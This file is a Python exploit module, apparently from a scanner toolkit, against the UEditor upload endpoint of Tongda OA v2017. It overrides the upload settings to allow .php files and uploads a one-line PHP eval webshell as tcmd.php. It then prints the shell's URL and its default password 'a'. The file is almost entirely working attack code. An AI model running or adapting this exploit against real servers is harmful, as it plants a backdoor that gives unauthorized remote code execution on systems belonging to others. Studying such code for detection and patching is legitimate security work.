import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v2017_action_upload(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "X_requested_with":"XMLHttpRequest",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=---------------------------55719851240137822763221368724"
        }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    data='''-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

fff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php eval($_REQUEST['a']);?>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--
'''
    upload_url=urldata+'module/ueditor/php/action_upload.php?action=uploadfile'
    exp_url=urldata+'tcmd.php'
    url = urldata + 'inc/expired.php'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        if upload.status_code == 200 and '2017' in response.text:
            print(Vcolors.RED + "[+] 通达OA v2017 上传webshell成功，请手动检测wbshell 默认密码为a" +Vcolors.ENDC)
            print(Vcolors.RED + "[+] {}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x] 通达OA v2017 action_upload任意文件上传漏洞不存在" +Vcolors.ENDC)
    except Exception as  e:
        logging.error("通达OA_v2017_action_upload脚本出现异常")


